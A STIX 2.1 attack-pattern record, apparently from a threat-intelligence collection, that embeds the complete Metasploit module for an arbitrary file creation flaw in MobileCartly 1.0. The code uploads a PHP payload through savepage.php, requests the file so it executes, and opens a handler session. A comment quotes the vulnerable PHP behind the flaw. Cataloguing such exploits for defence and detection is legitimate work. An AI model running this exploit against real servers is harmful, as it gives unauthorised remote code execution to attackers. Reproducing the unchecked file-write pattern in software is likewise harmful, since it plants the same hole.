{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--15aa9f38-7892-4581-9e1d-f25cc32a15c6",
    "created": "2024-08-14T17:09:15.154544Z",
    "modified": "2024-08-14T17:09:15.15455Z",
    "name": "\"MobileCartly 1.0 Arbitrary File Creation Vulnerability\"",
    "description": " This module exploits a vulnerability in MobileCartly.  The savepage.php file does not do any permission checks before using file_put_contents(), which allows any user to have direct control of that function to create files under the 'pages' directory by default, or anywhere else as long as the user has WRITE permission.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/mobilecartly_upload_exec.rb",
            "external_id": "mobilecartly_upload_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::PhpEXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MobileCartly 1.0 Arbitrary File Creation Vulnerability\",\n      'Description'    => %q{\n        This module exploits a vulnerability in MobileCartly.  The savepage.php file\n        does not do any permission checks before using file_put_contents(), which\n        allows any user to have direct control of that function to create files\n        under the 'pages' directory by default, or anywhere else as long as the user\n        has WRITE permission.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Yakir Wizman <yakir.wizman[at]gmail.com>', # Original discovery\n          'sinn3r' # Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '85509' ],\n          [ 'EDB', '20422 '],\n          [ 'BID', '55399 ']\n        ],\n      'Payload'        =>\n        {\n          # Goes in the query string, needs to fit in 8k. Leave a little\n          # exra for the other params and the path.\n          'Space'       => 8000,\n          'DisableNops' => true\n        },\n      'Platform'       => %w{ linux php },\n      'Targets'        =>\n        [\n          [ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' }  ],\n          [ 'Linux x86'            , { 'Arch' => ARCH_X86, 'Platform' => 'linux'} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-08-10',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base directory to MobileCartly', '/mobilecartly/'])\n      ])\n  end\n\n\n  def check\n    uri = normalize_uri(target_uri.path)\n    uri << '/' if uri[-1,1] != '/'\n    base = File.dirname(\"#{uri}.\")\n\n    res = send_request_raw({'uri'=>normalize_uri(uri, \"/index.php\")})\n    if res and res.body =~ /MobileCartly/\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n\n  def exploit\n    #\n    # Init target path\n    #\n    uri = normalize_uri(target_uri.path)\n    uri << '/' if uri[-1,1] != '/'\n    base = File.dirname(\"#{uri}.\")\n\n    #\n    # Configure payload names\n    #\n    php_fname = Rex::Text.rand_text_alpha(5) + \".php\"\n\n    #\n    # Upload payload\n    #\n    print_status(\"Uploading payload\")\n    res = send_request_cgi({\n      'uri' => normalize_uri(base, \"/includes/savepage.php\"),\n      'vars_get' => {\n        'savepage'    => php_fname,\n        'pagecontent' => get_write_exec_payload(:unlink_self=>true)\n      }\n    })\n\n    if not res\n      print_error(\"No response from server, will not continue.\")\n      return\n    end\n\n    #\n    # Run payload\n    #\n    print_status(\"Requesting '#{php_fname}'\")\n    send_request_cgi({ 'uri' => normalize_uri(base, 'pages', php_fname) })\n\n    handler\n  end\nend\n\n=begin\n*facepalm*\n\n<?php\n  $page = \"../pages/\" . $_REQUEST['savepage'];\n  $content = $_REQUEST['pagecontent'];\n  file_put_contents($page, $content);\n?>\n=end\n",
    "x_mitre_disclosure_date": "2012-08-10",
    "x_mitre_platforms": [
        "%w{ linux php }"
    ]
}